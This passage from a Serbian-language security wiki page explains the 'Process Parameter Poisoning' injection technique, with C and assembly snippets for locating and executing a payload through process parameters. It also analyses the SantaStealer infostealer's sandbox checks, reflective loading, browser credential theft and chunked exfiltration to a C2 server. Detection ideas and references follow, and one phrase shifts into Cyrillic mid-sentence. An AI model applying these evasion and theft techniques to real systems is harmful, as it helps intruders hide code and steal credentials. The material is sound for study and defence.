- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktična ograničenja nosilaca podataka:

- `lpCommandLine` mora da pokazuje na **memoriju u koju može da se upisuje** za `CreateProcessW` i ograničen je na **32,767 Unicode znakova**, uključujući završni null znak.
- `lpEnvironment` mora biti Unicode blok okruženja koji se sastoji od uzastopnih nizova `NAME=VALUE\0`, završen dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, pa mapiranje na `ShellInfo` treba smatrati detaljem implementacije, a ne stabilnim dokumentovanim ugovorom.

Time se uobičajeno kreiranje procesa pretvara u **primitiv za prenos payload-a**. Operator kreira child proces sa početnim podacima pod kontrolom napadača i prepušta Windows-u da obavi kopiranje između procesa.

### Tok udaljenog pronalaženja bez udaljenih API-ja za upis

Nakon kreiranja child procesa, pronađite kopirani bafer pomoću primitiva koji omogućavaju **samo čitanje**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → dobijanje `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Čitanje udaljenog `PEB`-a
3. Praćenje `PEB.ProcessParameters`
4. Čitanje `RTL_USER_PROCESS_PARAMETERS`
5. Korišćenje izabranog pokazivača:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalni tok:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Izvršavanje kopiranog bafera parametara

Kopirani region parametara je obično `RW`, a ne izvršiv. Uobičajeni P3 lanac je:

1. Kreirati proces na uobičajen način (ne suspendovan)
2. Učiniti izabranu stranicu parametara izvršivom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebiti handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmeriti izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepisati `RIP`)

Za razliku od klasičnih tokova rada za otmicu niti, ovo **ne zahteva** `SuspendThread` / `ResumeThread`; kontekst može direktno da se promeni preko vraćenog handle-a glavne niti.

Time se izbegava nekoliko API-ja koji se često nadgledaju zbog ubacivanja koda:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često i `SuspendThread` / `ResumeThread`

### Ograničenje nultog bajta i etapni shellcode

Sva tri nosača su **stringovi ili podaci nalik stringovima**, pa se sirovi payload koji sadrži `0x00` skraćuje tokom prenosa. Praktično rešenje je **prva etapa bez nultih bajtova** koja ponovo konstruiše konstante tokom izvršavanja, a zatim učitava proizvoljnu drugu etapu.

Jednostavan obrazac je sinteza konstanti zasnovana na XOR-u:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Ovo omogućava da prva faza formira stringove na steku, argumente API-ja, putanje DLL-ova ili loader za shellcode druge faze, bez ugrađivanja null bajtova u preneti parametar.

### Pozivi API-ja zasnovani na steku iz prve faze

Kada prva faza mora da poziva API-je kao što je `LoadLibraryA`, može da:

- postavi string/bufer na stek ciljnog procesa
- rezerviše **32-byte x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- održi **poravnanje `RSP` na 16 bajtova** pre poziva

Druga faza se zatim može kopirati sa steka u alokaciju `PAGE_READWRITE`, promeniti joj se zaštita u `PAGE_EXECUTE_READ` pomoću `VirtualProtect`, a potom se može izvršiti skok do nje, čime se izbegava direktna RWX alokacija.

### Ideje za detekciju

Dobre prilike za lov na pretnje koje su autori pomenuli:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kojim se **stranice parametara procesa označavaju kao izvršne**
- promena zaštite nakon koje sledi `SetThreadContext` / `NtSetContextThread`
- udaljeno čitanje `PEB`, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno dugačke vrednosti `lpCommandLine`, `lpEnvironment` ali i `STARTUPINFO.lpReserved` sa visokom entropijom tokom kreiranja procesa

### Napomene

- P3 je **trik za prenos između procesa**, a ne samostalna primitiva za izvršavanje: kopiranom parametru je i dalje potrebna promena dozvole izvršavanja i metod za preusmeravanje izvršavanja.
- Autori su razmatrali `RtlCreateProcessReflection` / Dirty Vanity, ali su ga odbacili jer interno koristi sumnjive primitive kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Tradecraft SantaStealer-a za fileless evaziju i krađu akreditiva

SantaStealer (poznat i kao BluelineStealer) pokazuje kako moderni info-stealeri kombinuju zaobilaženje AV-a, anti-analysis i pristup akreditivima u jednom toku rada.<sup>[[24]](#references)</sup>

### Provera rasporeda tastature i odlaganje u sandbox-u

- Zastavica konfiguracije (`anti_cis`) nabraja instalirane rasporede tastature pomoću funkcije `GetKeyboardLayoutList`. Ako pronađe ćirilični raspored, uzorak kreira prazan marker `CIS` i prekida rad pre pokretanja stealera. Time se sprečava njegovo aktiviranje u isključenim regionima, a istovremeno ostaje artefakt koji se može koristiti u lovu na pretnje.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Slojevita logika `check_antivm`

- Varijanta A prolazi kroz listu procesa, hešira svaki naziv pomoću prilagođene rolling checksum funkcije i poredi rezultat sa ugrađenim block-listama debugger-a/sandbox-a; ponavlja checksum nad nazivom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava svojstva sistema (minimalan broj procesa, nedavno vreme pokretanja), poziva `OpenServiceA("VBoxGuest")` radi otkrivanja VirtualBox additions i obavlja vremenske provere oko spavanja kako bi otkrila single-stepping. Svako poklapanje prekida izvršavanje pre pokretanja modula.

### Fileless helper + dvostruko ChaCha20 reflektivno učitavanje

- Primarni DLL/EXE sadrži Chromium credential helper koji se ili zapisuje na disk ili ručno mapira u memoriju; fileless režim sam razrešava imports/relocations, tako da se ne zapisuju artefakti helper-a.
- Taj helper čuva DLL druge faze šifrovan dvaput pomoću ChaCha20 (dva ključa od 32 bajta + nonce-ovi od 12 bajtova). Posle oba prolaza, reflektivno učitava blob (bez `LoadLibrary`) i poziva exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Rutine ChromElevator koriste direct-syscall reflective process hollowing da bi ubacile kod u pokrenuti Chromium pregledač, nasledile AppBound Encryption ključeve i dešifrovale lozinke/kolačiće/kreditne kartice direktno iz SQLite baza podataka, uprkos ABE zaštitama.


### Modularno prikupljanje u memoriji i HTTP exfil u segmentima

- `create_memory_based_log` prolazi kroz globalnu tabelu pokazivača na funkcije `memory_generators` i pokreće po jednu nit za svaki omogućen modul (Telegram, Discord, Steam, snimci ekrana, dokumenti, dodaci pregledača itd.). Svaka nit upisuje rezultate u shared buffers i prijavljuje broj fajlova po isteku perioda čekanja od približno 45 sekundi.
- Po završetku se sve arhivira pomoću statički povezane biblioteke `miniz` u `%TEMP%\\Log.zip`. `ThreadPayload1` zatim spava 15 sekundi i šalje arhivu u segmentima od 10 MB putem HTTP POST zahteva na `http://<C2>:6767/upload`, лажно представљајући `multipart/form-data` boundary pregledača (`----WebKitFormBoundary***`). Svaki segment dodaje `User-Agent: upload`, `auth: <build_id>`, opciono `w: <campaign_tag>`, a poslednji segment dodaje `complete: true` kako bi C2 znao da je ponovno sastavljanje završeno.

## References

- [1] [Napredne veštine izbegavanja: precizno Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Stekovi poziva: nema više besplatnih prolaza za malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacija](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – primer](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – primer](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC za lažiranje steka poziva](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Novi lanac infekcije i obfuskacija zasnovana na ConfuserEx za DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Da li treba da verujete svom zero trust-u? Zaobilaženje Zscaler provera bezbednosnog stanja](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Pre ToolShell-a: Istraživanje prethodnih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Zloupotreba prosleđenih exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar prosleđenih exports u Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Redosled pretrage dinamičkih biblioteka](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Bezbednost procesa i prava pristupa](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU referenca (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Pokretač CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Suprotstavljanje EDR-ovima uz pomoć Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Razbijanje zaštitnog omotača Windows Defender-a tehnikom preusmeravanja fascikli](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenca za komandu mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Iza čiste zavese: od RAT-a do builder-a i programera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer stiže u grad: novi, ambiciozni infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Dešifrovanje Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: suzbijanje Node.js malware-a praćenjem API-ja](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Uspavana lepotica: stavljanje Adaptix-a na spavanje pomoću Crystal Palace-a](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Trovanje parametara procesa](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Uspavana lepotica II: CFG, CET i lažiranje steka](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko obfuskacija tokom spavanja](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Sakrivanje Dotnet ETW-a](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Zloupotreba Chrome Remote Desktop-a u operacijama Red Team-a: praktični vodič](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: Pretvaranje Defender-ovog drajvera za sanaciju u primitivu za operacije na kernelu](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Prateći kod za MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: Kreiranje funkcija koje same sebe maskiraju pomoću LLVM-a](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
